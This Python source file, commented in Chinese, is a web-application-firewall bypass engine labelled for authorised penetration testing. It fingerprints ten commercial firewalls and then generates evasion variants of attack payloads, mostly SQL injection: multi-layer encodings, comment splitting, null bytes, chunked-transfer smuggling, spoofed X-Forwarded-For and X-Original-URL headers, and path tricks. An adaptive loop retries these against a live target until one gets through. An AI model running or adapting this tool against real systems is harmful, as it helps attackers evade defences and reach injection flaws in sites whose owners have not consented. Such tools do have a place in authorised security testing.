#!/usr/bin/env python3
"""
WAF 绕过增强引擎 - Enhanced WAF Bypass Engine
功能: 协议层绕过、自适应变异、WAF指纹识别、请求头伪造
仅用于授权渗透测试
"""

import re
import random
import string
import urllib.parse
import hashlib
import json
import logging
from typing import Dict, List, Optional, Tuple, Any, Callable
from dataclasses import dataclass, field
from enum import Enum
from abc import ABC, abstractmethod

logger = logging.getLogger(__name__)


class WAFType(Enum):
    """WAF类型"""
    CLOUDFLARE = "cloudflare"
    AWS_WAF = "aws_waf"
    AKAMAI = "akamai"
    MODSECURITY = "modsecurity"
    IMPERVA = "imperva"
    F5_BIGIP = "f5_bigip"
    FORTINET = "fortinet"
    SUCURI = "sucuri"
    BARRACUDA = "barracuda"
    CITRIX = "citrix"
    UNKNOWN = "unknown"


WAF_NAME_ALIASES: Dict[str, WAFType] = {
    "cloudflare": WAFType.CLOUDFLARE,
    "aws waf": WAFType.AWS_WAF,
    "aws_waf": WAFType.AWS_WAF,
    "akamai": WAFType.AKAMAI,
    "modsecurity": WAFType.MODSECURITY,
    "mod_security": WAFType.MODSECURITY,
    "imperva": WAFType.IMPERVA,
    "incapsula": WAFType.IMPERVA,
    "f5": WAFType.F5_BIGIP,
    "big-ip": WAFType.F5_BIGIP,
    "bigip": WAFType.F5_BIGIP,
    "fortinet": WAFType.FORTINET,
    "fortiweb": WAFType.FORTINET,
    "sucuri": WAFType.SUCURI,
    "barracuda": WAFType.BARRACUDA,
    "citrix": WAFType.CITRIX,
    "netscaler": WAFType.CITRIX,
}


def normalize_waf_type(waf_name: Optional[str]) -> WAFType:
    """归一化WAF名称到WAFType"""
    if isinstance(waf_name, WAFType):
        return waf_name
    if not waf_name:
        return WAFType.UNKNOWN
    lowered = str(waf_name).lower()
    for key, waf_type in WAF_NAME_ALIASES.items():
        if key in lowered:
            return waf_type
    return WAFType.UNKNOWN


class BypassTechnique(Enum):
    """绕过技术"""
    ENCODING = "encoding"
    CASE_VARIATION = "case_variation"
    COMMENT_INJECTION = "comment_injection"
    WHITESPACE_MANIPULATION = "whitespace"
    CHUNKED_TRANSFER = "chunked"
    HTTP2_SMUGGLING = "http2"
    HEADER_INJECTION = "header_injection"
    PARAMETER_POLLUTION = "param_pollution"
    PROTOCOL_DOWNGRADE = "protocol_downgrade"
    PATH_NORMALIZATION = "path_normalization"


@dataclass
class WAFFingerprint:
    """WAF指纹"""
    waf_type: WAFType
    confidence: float
    version: Optional[str] = None
    ruleset: Optional[str] = None  # CRS版本等
    features: Dict[str, Any] = field(default_factory=dict)


@dataclass
class BypassResult:
    """绕过结果"""
    success: bool
    original_payload: str
    bypassed_payload: str
    technique: BypassTechnique
    waf_type: Optional[WAFType] = None
    confidence: float = 0.0
    request_modifications: Dict[str, Any] = field(default_factory=dict)


class WAFDetector:
    """WAF检测器 - 增强版"""
    
    # WAF指纹库 - 包含响应头、响应体、Cookie特征
    WAF_FINGERPRINTS: Dict[str, Dict[str, Any]] = {
        "cloudflare": {
            "headers": ["cf-ray", "cf-cache-status", "__cfduid", "cf-request-id"],
            "cookies": ["__cfduid", "__cf_bm", "cf_clearance"],
            "body_patterns": [r"cloudflare", r"attention required", r"checking your browser"],
            "status_codes": [403, 503, 1020],
            "versions": {
                "enterprise": ["cf-cache-status: dynamic"],
                "pro": ["cf-ray"],
            }
        },
        "aws_waf": {
            "headers": ["x-amzn-requestid", "x-amz-cf-id", "x-amzn-errortype"],
            "cookies": ["awselb", "awsalb"],
            "body_patterns": [r"request blocked", r"waf", r"403 forbidden"],
            "status_codes": [403],
        },
        "akamai": {
            "headers": ["x-akamai-transformed", "akamai-grn", "x-akamai-session-info"],
            "cookies": ["ak_bmsc", "bm_sv", "bm_sz"],
            "body_patterns": [r"akamai", r"access denied", r"reference.*#"],
            "status_codes": [403],
        },
        "modsecurity": {
            "headers": ["x-mod-security", "mod_security"],
            "body_patterns": [
                r"mod_security", r"modsecurity", r"noyb", 
                r"request rejected", r"bad request"
            ],
            "status_codes": [403, 406],
            "versions": {
                "crs3": [r"owasp.*crs.*3", r"modsecurity.*3"],
                "crs2": [r"modsecurity.*2"],
            }
        },
        "imperva": {
            "headers": ["x-iinfo"],
            "cookies": ["incap_ses", "visid_incap", "nlbi_"],
            "body_patterns": [r"incapsula", r"incident id", r"powered by incapsula"],
            "status_codes": [403],
        },
        "f5_bigip": {
            "headers": ["x-wa-info", "x-cnection"],
            "cookies": ["bigipserver", "ts", "f5_cspm"],
            "body_patterns": [r"bigip", r"f5 networks", r"application security manager"],
            "status_codes": [403],
        },
        "fortinet": {
            "headers": ["x-fortigate", "fortigate"],
            "body_patterns": [r"fortiguard", r"fortigate", r"web filter"],
            "status_codes": [403],
        },
        "sucuri": {
            "headers": ["x-sucuri-id", "x-sucuri-cache"],
            "body_patterns": [r"sucuri", r"cloudproxy", r"access denied.*sucuri"],
            "status_codes": [403],
        },
        "barracuda": {
            "headers": ["barra_counter_session"],
            "cookies": ["barra_counter_session"],
            "body_patterns": [r"barracuda", r"web application firewall"],
            "status_codes": [403],
        },
        "citrix": {
            "headers": ["ns_af"],
            "cookies": ["citrix_ns_id", "nsc_"],
            "body_patterns": [r"citrix", r"netscaler", r"appfw"],
            "status_codes": [403],
        },
    }
    
    def detect(self, response_headers: Dict[str, str], response_body: str,
               status_code: int = 200) -> WAFFingerprint:
        """检测WAF类型和版本"""
        headers_lower = {k.lower(): v.lower() for k, v in response_headers.items()}
        body_lower = response_body.lower()
        
        best_match = None
        best_confidence = 0.0
        
        for waf_name, fingerprint in self.WAF_FINGERPRINTS.items():
            score = 0.0
            max_score = 0.0
            
            # 检查响应头
            header_patterns = fingerprint.get("headers", [])
            max_score += len(header_patterns) * 2
            for pattern in header_patterns:
                if any(pattern.lower() in h for h in headers_lower.keys()):
                    score += 2
            
            # 检查Cookie
            cookie_patterns = fingerprint.get("cookies", [])
            max_score += len(cookie_patterns) * 1.5
            cookies = headers_lower.get("set-cookie", "") + headers_lower.get("cookie", "")
            for pattern in cookie_patterns:
                if pattern.lower() in cookies:
                    score += 1.5
            
            # 检查响应体
            body_patterns = fingerprint.get("body_patterns", [])
            max_score += len(body_patterns) * 1
            for pattern in body_patterns:
                if re.search(pattern, body_lower, re.IGNORECASE):
                    score += 1
            
            # 检查状态码
            expected_codes = fingerprint.get("status_codes", [])
            if expected_codes:
                max_score += 1
                if status_code in expected_codes:
                    score += 1
            
            # 计算置信度
            confidence = score / max_score if max_score > 0 else 0
            
            if confidence > best_confidence:
                best_confidence = confidence
                best_match = waf_name
        
        if best_match and best_confidence >= 0.3:
            waf_type = WAFType(best_match) if best_match in [e.value for e in WAFType] else WAFType.UNKNOWN
            
            # 检测版本
            version = self._detect_version(best_match, headers_lower, body_lower)
            
            return WAFFingerprint(
                waf_type=waf_type,
                confidence=best_confidence,
                version=version,
                features={"detected_from": best_match}
            )
        
        return WAFFingerprint(waf_type=WAFType.UNKNOWN, confidence=0.0)
    
    def _detect_version(self, waf_name: str, headers: Dict[str, str], body: str) -> Optional[str]:
        """检测WAF版本"""
        fingerprint = self.WAF_FINGERPRINTS.get(waf_name, {})
        versions = fingerprint.get("versions", {})
        
        combined = json.dumps(headers) + body
        for version_name, patterns in versions.items():
            for pattern in patterns:
                if re.search(pattern, combined, re.IGNORECASE):
                    return version_name
        
        return None


class PayloadMutator:
    """Payload变异器 - 增强版"""
    
    def __init__(self):
        # 变异策略 (实例属性)
        self.mutations: Dict[str, Callable[[str], str]] = {}
        self._register_mutations()
    
    def _register_mutations(self):
        """注册所有变异方法"""
        self.mutations = {
            # 基础编码变异
            "url_encode": self._url_encode,
            "double_url_encode": self._double_url_encode,
            "triple_url_encode": self._triple_url_encode,
            "hex_encode": self._hex_encode,
            "unicode_encode": self._unicode_encode,
            "html_entity": self._html_entity_encode,
            "html_entity_hex": self._html_entity_hex_encode,
            
            # 大小写变异
            "random_case": self._random_case,
            "alternating_case": self._alternating_case,
            
            # SQL特定变异
            "comment_inline": self._sql_comment_inline,
            "comment_multiline": self._sql_comment_multiline,
            "mysql_version_comment": self._mysql_version_comment,
            
            # 空白符变异
            "whitespace_tab": self._whitespace_tab,
            "whitespace_newline": self._whitespace_newline,
            "whitespace_carriage": self._whitespace_carriage,
            "whitespace_vertical": self._whitespace_vertical,
            "whitespace_null": self._whitespace_null,
            
            # 字符串操作
            "concat_plus": self._concat_plus,
            "concat_pipe": self._concat_pipe,
            "concat_function": self._concat_function,
            
            # 高级绕过
            "scientific_notation": self._scientific_notation,
            "char_function": self._char_function,
        }
    
    # ===== 编码变异 =====
    def _url_encode(self, payload: str) -> str:
        """URL编码"""
        return urllib.parse.quote(payload, safe='')
    
    def _double_url_encode(self, payload: str) -> str:
        """双重URL编码"""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
    
    def _triple_url_encode(self, payload: str) -> str:
        """三重URL编码"""
        return self._url_encode(self._double_url_encode(payload))
    
    def _hex_encode(self, payload: str) -> str:
        """十六进制编码"""
        return ''.join(f'%{ord(c):02x}' for c in payload)
    
    def _unicode_encode(self, payload: str) -> str:
        """Unicode编码"""
        return ''.join(f'%u00{ord(c):02x}' if ord(c) < 256 else c for c in payload)
    
    def _html_entity_encode(self, payload: str) -> str:
        """HTML实体编码（十进制）"""
        return ''.join(f'&#{ord(c)};' for c in payload)
    
    def _html_entity_hex_encode(self, payload: str) -> str:
        """HTML实体编码（十六进制）"""
        return ''.join(f'&#x{ord(c):x};' for c in payload)
    
    # ===== 大小写变异 =====
    def _random_case(self, payload: str) -> str:
        """随机大小写"""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
    
    def _alternating_case(self, payload: str) -> str:
        """交替大小写"""
        return ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload))
    
    # ===== SQL注释变异 =====
    def _sql_comment_inline(self, payload: str) -> str:
        """SQL行内注释分割"""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT', 'UPDATE', 'DELETE']
        result = payload
        for kw in keywords:
            # 在关键字中间插入注释
            if len(kw) > 2:
                mid = len(kw) // 2
                split_kw = kw[:mid] + '/**/' + kw[mid:]
                result = re.sub(rf'\b{kw}\b', split_kw, result, flags=re.IGNORECASE)
        return result
    
    def _sql_comment_multiline(self, payload: str) -> str:
        """多行注释替换空格"""
        return payload.replace(' ', '/**/')
    
    def _mysql_version_comment(self, payload: str) -> str:
        """MySQL版本注释"""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE']
        result = payload
        for kw in keywords:
            result = re.sub(rf'\b{kw}\b', f'/*!50000{kw}*/', result, flags=re.IGNORECASE)
        return result
    
    # ===== 空白符变异 =====
    def _whitespace_tab(self, payload: str) -> str:
        """Tab替换空格"""
        return payload.replace(' ', '\t')
    
    def _whitespace_newline(self, payload: str) -> str:
        """换行符替换空格"""
        return payload.replace(' ', '\n')
    
    def _whitespace_carriage(self, payload: str) -> str:
        """回车符替换空格"""
        return payload.replace(' ', '\r')
    
    def _whitespace_vertical(self, payload: str) -> str:
        """垂直制表符替换空格"""
        return payload.replace(' ', '\x0b')
    
    def _whitespace_null(self, payload: str) -> str:
        """NULL字节插入"""
        return payload.replace(' ', '%00')
    
    # ===== 字符串拼接变异 =====
    def _concat_plus(self, payload: str) -> str:
        """使用+拼接字符串"""
        # 针对字符串常量
        return re.sub(r"'([^']+)'", lambda m: "'" + "'+'" .join(m.group(1)) + "'", payload)
    
    def _concat_pipe(self, payload: str) -> str:
        """使用||拼接（Oracle/PostgreSQL）"""
        return re.sub(r"'([^']+)'", lambda m: "'" + "'||'" .join(m.group(1)) + "'", payload)
    
    def _concat_function(self, payload: str) -> str:
        """使用CONCAT函数"""
        def replace_string(m: re.Match[str]) -> str:
            s = m.group(1)
            if len(s) > 2:
                mid = len(s) // 2
                return f"CONCAT('{s[:mid]}','{s[mid:]}')"
            return m.group(0)
        return re.sub(r"'([^']+)'", replace_string, payload)
    
    # ===== 高级变异 =====
    def _scientific_notation(self, payload: str) -> str:
        """数字科学计数法"""
        # 1=1 -> 1=1e0
        return re.sub(r'\b(\d+)\b', r'\1e0', payload)
    
    def _char_function(self, payload: str) -> str:
        """使用CHAR函数替换字符串"""
        def to_char(s: str) -> str:
            chars = ','.join(str(ord(c)) for c in s)
            return f"CHAR({chars})"
        return re.sub(r"'([^']*)'", lambda m: to_char(m.group(1)), payload)
    
    def mutate(self, payload: str, technique: str) -> str:
        """应用单个变异"""
        if technique in self.mutations:
            return self.mutations[technique](payload)
        return payload
    
    def mutate_multi(self, payload: str, techniques: List[str]) -> str:
        """应用多个变异（按顺序）"""
        result = payload
        for tech in techniques:
            result = self.mutate(result, tech)
        return result
    
    def generate_variants(self, payload: str, max_variants: int = 50) -> List[Tuple[str, List[str]]]:
        """生成payload变体"""
        variants: List[Tuple[str, List[str]]] = [(payload, [])]  # 原始payload

        # 单一变异
        for tech_name in self.mutations.keys():
            try:
                mutated = self.mutate(payload, tech_name)
                if mutated != payload:
                    variants.append((mutated, [tech_name]))
            except (ValueError, UnicodeError, KeyError, TypeError):
                continue

        # 组合变异（2层）
        combo_techniques = [
            ["random_case", "url_encode"],
            ["comment_inline", "random_case"],
            ["whitespace_tab", "double_url_encode"],
            ["mysql_version_comment", "random_case"],
            ["comment_multiline", "url_encode"],
            ["unicode_encode", "random_case"],
            ["hex_encode", "whitespace_newline"],
        ]

        for combo in combo_techniques:
            try:
                mutated = self.mutate_multi(payload, combo)
                if mutated != payload:
                    variants.append((mutated, combo))
            except (ValueError, UnicodeError, KeyError, TypeError):
                continue
        
        return variants[:max_variants]


class ChunkedEncoder:
    """Chunked Transfer Encoding 绕过器"""
    
    @staticmethod
    def encode(data: str, chunk_size: int = 1) -> bytes:
        """将数据编码为chunked格式"""
        result = b""
        data_bytes = data.encode('utf-8')
        
        for i in range(0, len(data_bytes), chunk_size):
            chunk = data_bytes[i:i+chunk_size]
            # 格式: 块大小(十六进制)\r\n数据\r\n
            result += f"{len(chunk):x}\r\n".encode()
            result += chunk + b"\r\n"
        
        # 结束块
        result += b"0\r\n\r\n"
        return result
    
    @staticmethod
    def encode_with_junk(data: str, chunk_size: int = 1, 
                         junk_ratio: float = 0.3) -> bytes:
        """带垃圾数据的chunked编码"""
        result = b""
        data_bytes = data.encode('utf-8')
        
        for i in range(0, len(data_bytes), chunk_size):
            chunk = data_bytes[i:i+chunk_size]
            
            # 随机添加垃圾扩展（chunk-extension）
            extension = ""
            if random.random() < junk_ratio:
                ext_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))
                ext_value = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(5, 15)))
                extension = f";{ext_name}={ext_value}"
            
            result += f"{len(chunk):x}{extension}\r\n".encode()
            result += chunk + b"\r\n"
        
        result += b"0\r\n\r\n"
        return result


class HeaderManipulator:
    """请求头操纵器"""
    
    # 用于绕过的伪造头
    BYPASS_HEADERS: Dict[str, List[Tuple[str, str]]] = {
        # IP伪造头
        "ip_spoof": [
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Client-IP", "127.0.0.1"),
            ("X-Originating-IP", "127.0.0.1"),
            ("CF-Connecting-IP", "127.0.0.1"),
            ("True-Client-IP", "127.0.0.1"),
            ("X-Cluster-Client-IP", "127.0.0.1"),
            ("Forwarded", "for=127.0.0.1"),
            ("X-Remote-IP", "127.0.0.1"),
            ("X-Remote-Addr", "127.0.0.1"),
        ],
        # URL重写头
        "url_rewrite": [
            ("X-Original-URL", "/"),
            ("X-Rewrite-URL", "/"),
            ("X-Override-URL", "/"),
            ("X-Custom-IP-Authorization", "127.0.0.1"),
        ],
        # Content-Type绕过
        "content_type": [
            ("Content-Type", "application/x-www-form-urlencoded; charset=ibm037"),
            ("Content-Type", "application/x-www-form-urlencoded; charset=utf-7"),
            ("Content-Type", "application/json"),
            ("Content-Type", "text/xml"),
            ("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary"),
        ],
        # Host头操纵
        "host_manipulation": [
            ("Host", "localhost"),
            ("X-Host", "localhost"),
            ("X-Forwarded-Host", "localhost"),
        ],
    }
    
    @classmethod
    def get_bypass_headers(cls, category: str = "all") -> Dict[str, str]:
        """获取绕过用的请求头"""
        headers = {}
        
        if category == "all":
            for cat_headers in cls.BYPASS_HEADERS.values():
                for name, value in cat_headers:
                    headers[name] = value
        elif category in cls.BYPASS_HEADERS:
            for name, value in cls.BYPASS_HEADERS[category]:
                headers[name] = value
        
        return headers
    
    @classmethod
    def get_random_bypass_headers(cls, count: int = 3) -> Dict[str, str]:
        """随机选择绕过头"""
        all_headers = []
        for cat_headers in cls.BYPASS_HEADERS.values():
            all_headers.extend(cat_headers)
        
        selected = random.sample(all_headers, min(count, len(all_headers)))
        return {name: value for name, value in selected}


class PathNormalizer:
    """路径规范化绕过器"""
    
    @staticmethod
    def generate_variants(path: str) -> List[str]:
        """生成路径变体"""
        variants = [path]
        
        # 双斜杠
        variants.append(path.replace('/', '//'))
        
        # 点斜杠
        variants.append(path.replace('/', '/./'))
        
        # URL编码斜杠
        variants.append(path.replace('/', '%2f'))
        variants.append(path.replace('/', '%2F'))
        
        # 双重编码
        variants.append(path.replace('/', '%252f'))
        
        # Unicode斜杠变体
        variants.append(path.replace('/', '%c0%af'))  # UTF-8 overlong
        variants.append(path.replace('/', '%c1%9c'))
        
        # 反斜杠（IIS）
        variants.append(path.replace('/', '\\'))
        variants.append(path.replace('/', '%5c'))
        
        # 大小写（Windows）
        if path.lower() != path:
            variants.append(path.lower())
            variants.append(path.upper())
        
        # 末尾添加
        variants.append(path + '/')
        variants.append(path + '/.')
        variants.append(path + '%00')
        variants.append(path + '%20')
        variants.append(path + '?')
        variants.append(path + '#')
        
        return list(set(variants))


class WAFBypassEngine:
    """
    WAF绕过引擎 - 主类
    
    Usage:
        engine = WAFBypassEngine()
        
        # 检测WAF
        waf = engine.detect_waf(response_headers, response_body)
        
        # 生成绕过payload
        bypasses = engine.generate_bypass(payload, waf.waf_type)
        
        # 自适应绕过
        result = engine.adaptive_bypass(payload, test_callback)
    """
    
    # WAF特定绕过策略
    WAF_STRATEGIES: Dict[WAFType, List[str]] = {
        WAFType.CLOUDFLARE: [
            "double_url_encode", "unicode_encode", "mysql_version_comment",
            "whitespace_newline", "random_case"
        ],
        WAFType.AWS_WAF: [
            "random_case", "whitespace_tab", "concat_function",
            "comment_multiline", "scientific_notation"
        ],
        WAFType.MODSECURITY: [
            "comment_inline", "hex_encode", "double_url_encode",
            "whitespace_null", "char_function"
        ],
        WAFType.IMPERVA: [
            "unicode_encode", "random_case", "whitespace_vertical",
            "mysql_version_comment", "triple_url_encode"
        ],
        WAFType.AKAMAI: [
            "double_url_encode", "comment_inline", "random_case",
            "whitespace_carriage", "concat_plus"
        ],
        WAFType.F5_BIGIP: [
            "url_encode", "comment_multiline", "whitespace_tab",
            "alternating_case", "html_entity"
        ],
        WAFType.UNKNOWN: [
            "url_encode", "random_case", "comment_inline",
            "double_url_encode", "whitespace_tab"
        ],
    }
    
    def __init__(self):
        self.detector = WAFDetector()
        self.mutator = PayloadMutator()
        self.chunked_encoder = ChunkedEncoder()
        self.header_manipulator = HeaderManipulator()
        self.path_normalizer = PathNormalizer()
        
        # 绕过成功统计: {waf_type: {technique: {"success": count, "fail": count}}}
        self._success_stats: Dict[str, Dict[str, Dict[str, int]]] = {}
    
    def detect_waf(self, response_headers: Dict[str, str], response_body: str,
                   status_code: int = 200) -> WAFFingerprint:
        """检测WAF"""
        return self.detector.detect(response_headers, response_body, status_code)
    
    def generate_bypass(self, payload: str, waf_type: WAFType = WAFType.UNKNOWN,
                        max_variants: int = 30) -> List[BypassResult]:
        """生成针对特定WAF的绕过payload"""
        results = []
        
        # 获取WAF特定策略
        strategies = self.WAF_STRATEGIES.get(waf_type, self.WAF_STRATEGIES[WAFType.UNKNOWN])
        
        # 应用单个策略
        for strategy in strategies:
            try:
                bypassed = self.mutator.mutate(payload, strategy)
                if bypassed != payload:
                    results.append(BypassResult(
                        success=False,  # 需要实际测试才知道
                        original_payload=payload,
                        bypassed_payload=bypassed,
                        technique=BypassTechnique.ENCODING,
                        waf_type=waf_type,
                        confidence=0.5,
                    ))
            except Exception as e:
                logger.debug(f"变异失败 {strategy}: {e}")
        
        # 组合策略
        if len(strategies) >= 2:
            for i in range(min(5, len(strategies) - 1)):
                combo = [strategies[i], strategies[i + 1]]
                try:
                    bypassed = self.mutator.mutate_multi(payload, combo)
                    if bypassed != payload:
                        results.append(BypassResult(
                            success=False,
                            original_payload=payload,
                            bypassed_payload=bypassed,
                            technique=BypassTechnique.ENCODING,
                            waf_type=waf_type,
                            confidence=0.6,
                        ))
                except (ValueError, UnicodeError, KeyError, TypeError):
                    continue
        
        return results[:max_variants]
    
    def generate_chunked_bypass(self, payload: str, body: str) -> Dict[str, Any]:
        """生成Chunked Transfer Encoding绕过"""
        # 将payload嵌入body
        modified_body = body.replace("PAYLOAD_PLACEHOLDER", payload)
        
        # 正常chunked
        chunked_normal = self.chunked_encoder.encode(modified_body, chunk_size=1)
        
        # 带垃圾扩展的chunked
        chunked_junk = self.chunked_encoder.encode_with_junk(
            modified_body, chunk_size=1, junk_ratio=0.5
        )
        
        return {
            "headers": {"Transfer-Encoding": "chunked"},
            "body_normal": chunked_normal,
            "body_junk": chunked_junk,
            "technique": BypassTechnique.CHUNKED_TRANSFER,
        }
    
    def generate_header_bypass(self, path: str = "/") -> List[Dict[str, Any]]:
        """生成请求头绕过"""
        bypasses = []
        
        # IP伪造
        bypasses.append({
            "headers": self.header_manipulator.get_bypass_headers("ip_spoof"),
            "technique": BypassTechnique.HEADER_INJECTION,
            "description": "IP伪造绕过",
        })
        
        # URL重写
        url_headers = self.header_manipulator.get_bypass_headers("url_rewrite")
        for name, value in url_headers.items():
            bypasses.append({
                "headers": {name: path},
                "technique": BypassTechnique.HEADER_INJECTION,
                "description": f"{name}重写绕过",
            })
        
        # Content-Type混淆
        bypasses.append({
            "headers": self.header_manipulator.get_bypass_headers("content_type"),
            "technique": BypassTechnique.HEADER_INJECTION,
            "description": "Content-Type混淆",
        })
        
        return bypasses
    
    def generate_path_bypass(self, path: str) -> List[str]:
        """生成路径绕过变体"""
        return self.path_normalizer.generate_variants(path)
    
    def adaptive_bypass(self, payload: str, 
                        test_func: Callable[[str, Dict[str, str]], Tuple[bool, Any]],
                        max_attempts: int = 50) -> Optional[BypassResult]:
        """
        自适应绕过 - 根据测试结果动态调整策略
        
        Args:
            payload: 原始payload
            test_func: 测试函数，接收(payload, headers)，返回(是否绕过, 响应)
            max_attempts: 最大尝试次数
        
        Returns:
            成功的绕过结果或None
        """
        # 首先测试原始payload获取WAF指纹
        blocked, response = test_func(payload, {})
        
        if not blocked:
            # 原始payload就能过
            return BypassResult(
                success=True,
                original_payload=payload,
                bypassed_payload=payload,
                technique=BypassTechnique.ENCODING,
                confidence=1.0,
            )
        
        # 检测WAF
        waf_fingerprint = WAFFingerprint(waf_type=WAFType.UNKNOWN, confidence=0.0)
        if hasattr(response, 'headers') and hasattr(response, 'text'):
            waf_fingerprint = self.detect_waf(
                dict(response.headers),
                response.text,
                response.status_code
            )
        
        # 生成绕过变体
        variants = self.generate_bypass(payload, waf_fingerprint.waf_type, max_variants=max_attempts)
        
        # 逐个测试
        for variant in variants:
            # 添加随机绕过头
            headers = self.header_manipulator.get_random_bypass_headers(2)
            
            blocked, _ = test_func(variant.bypassed_payload, headers)
            
            if not blocked:
                variant.success = True
                variant.confidence = 0.9
                variant.request_modifications = {"headers": headers}
                
                # 更新统计
                self._update_stats(waf_fingerprint.waf_type, variant.technique, True)
                
                return variant
            
            self._update_stats(waf_fingerprint.waf_type, variant.technique, False)
        
        return None
    
    def _update_stats(self, waf_type: WAFType, technique: BypassTechnique, success: bool):
        """更新绕过统计"""
        waf_key = waf_type.value
        tech_key = technique.value
        
        if waf_key not in self._success_stats:
            self._success_stats[waf_key] = {}
        
        if tech_key not in self._success_stats[waf_key]:
            self._success_stats[waf_key][tech_key] = {"success": 0, "fail": 0}
        
        if success:
            self._success_stats[waf_key][tech_key]["success"] += 1
        else:
            self._success_stats[waf_key][tech_key]["fail"] += 1
    
    def get_recommended_techniques(self, waf_type: WAFType) -> List[str]:
        """根据历史统计获取推荐的绕过技术"""
        waf_key = waf_type.value
        
        if waf_key not in self._success_stats:
            return self.WAF_STRATEGIES.get(waf_type, [])[:5]
        
        # 按成功率排序
        tech_scores = []
        for tech, stats in self._success_stats[waf_key].items():
            total = stats["success"] + stats["fail"]
            if total > 0:
                rate = stats["success"] / total
                tech_scores.append((tech, rate))
        
        tech_scores.sort(key=lambda x: x[1], reverse=True)
        return [t[0] for t in tech_scores[:10]]


# 便捷函数
def bypass_waf(payload: str, waf_type: str = "unknown") -> List[str]:
    """快速生成WAF绕过payload"""
    engine = WAFBypassEngine()
    waf = normalize_waf_type(waf_type)
    results = engine.generate_bypass(payload, waf)
    return [r.bypassed_payload for r in results]


def detect_waf(headers: Dict[str, str], body: str, status: int = 200) -> Dict[str, Any]:
    """检测WAF类型"""
    detector = WAFDetector()
    result = detector.detect(headers, body, status)
    return {
        "waf_type": result.waf_type.value,
        "confidence": result.confidence,
        "version": result.version,
    }
